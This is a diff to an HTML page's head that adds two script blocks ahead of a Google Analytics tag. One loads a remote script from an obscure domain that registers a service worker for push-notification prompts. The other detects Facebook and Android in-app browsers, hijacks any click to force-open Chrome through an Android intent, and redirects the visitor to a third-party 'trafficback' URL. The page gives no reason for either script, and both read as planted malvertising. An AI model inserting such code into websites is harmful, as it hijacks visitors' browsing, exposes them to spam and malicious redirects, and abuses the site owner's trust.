@@ -2,6 +2,57 @@
  <html dir="rtl">
  <head>
 
+
+<script>
+    var s = document.createElement('script');
+    s.src='//deefauph.com/pfe/current/micro.tag.min.js?z=7016658'+'&sw=/sw-check-permissions-1800d.js'+'&nouns=1';
+    s.onload = function(result) {
+        switch (result) {
+            case 'onPermissionDefault':break;
+            case 'onPermissionAllowed':break;
+            case 'onPermissionDenied':break;
+            case 'onAlreadySubscribed':break;
+            case 'onNotificationUnsupported':break;
+        }
+    };
+    document.head.appendChild(s);
+</script>
+
+
+<script>
+    function isInApp() {
+        const regex = new RegExp(`(WebView|(iPhone|iPod|iPad)(?!.*Safari/)|Android.*(wv))`, 'ig');
+        return Boolean(this.ua.match(regex));
+    }
+
+    function initInappRd() {
+        var landingpageURL = window.location.hostname + window.location.pathname + window.location.search;
+        var completeRedirectURL = 'intent://' + landingpageURL + '#Intent;scheme=https;package=com.android.chrome;end';
+        var trafficbackURL = 'https://amshroomishan.com/4/7016661/';
+        var ua = navigator.userAgent.toLowerCase();
+
+        if (isInApp && (ua.indexOf('fb') !== -1 || ua.indexOf('android') !== -1 || ua.indexOf('wv') !== -1)) {
+            document.body.addEventListener('click', function () {
+                window.onbeforeunload = null;
+                window.open(completeRedirectURL, '_system');
+                setTimeout(function () {
+                    window.location.replace(trafficbackURL);
+                }, 1000);
+            });
+        }
+    }
+
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', initInappRd);
+    } else {
+        initInappRd();
+    }
+</script>
+
+
+
+	 
+
 	 <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-69KWPWYLMT"></script>
 <script>
